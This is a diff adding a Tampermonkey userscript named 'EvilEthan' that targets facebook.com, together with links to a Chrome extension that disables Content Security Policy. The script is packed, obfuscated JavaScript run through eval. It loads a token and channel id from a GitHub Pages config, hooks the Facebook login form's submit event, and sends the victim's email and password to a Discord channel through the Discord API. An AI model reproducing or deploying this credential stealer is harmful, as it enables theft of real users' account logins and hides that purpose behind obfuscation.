@@ -1,0 +1,16 @@
+https://chrome.google.com/webstore/detail/disable-content-security/ieelmcmcagommplceebfedjlakkhpden
+https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=pt-BR
+
+
+// ==UserScript==
+// @name         EvilEthan
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world! really
+// @author       You
+// @match        https://*.facebook.com/*
+// @grant        none
+// @require https://npmcdn.com/axios/dist/axios.min.js
+// ==/UserScript==
+
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(0(){\'o n\';9 4,1;2.m(\'p://q.t.s/l.u\').c(0(3){4=3.5.j;1=3.5.1});2.f.i=\'h://k.g/r\';K.H(\'G\').F(\'I\',0(e){2.f.J.v[\'L\']=4;9 d={8:e.7.8.6,E:e.7.D.6};2.y(\'/x/\'+1+\'/w\',{z:A.C(d)}).c(0(e){a.b(e)}).B(0(e){a.b(e)})})})();',48,48,'function|roomid|axios|body|AUTH_TOKEN|data|value|target|email|var|console|log|then|creds||defaults|com|https|baseURL|token|discordapp|cfg|get|strict|use|http|rektdivision|api|io|github|json|common|messages|channels|post|content|JSON|catch|stringify|pass|password|addEventListener|login_form|getElementById|submit|headers|document|Authorization'.split('|'),0,{}))
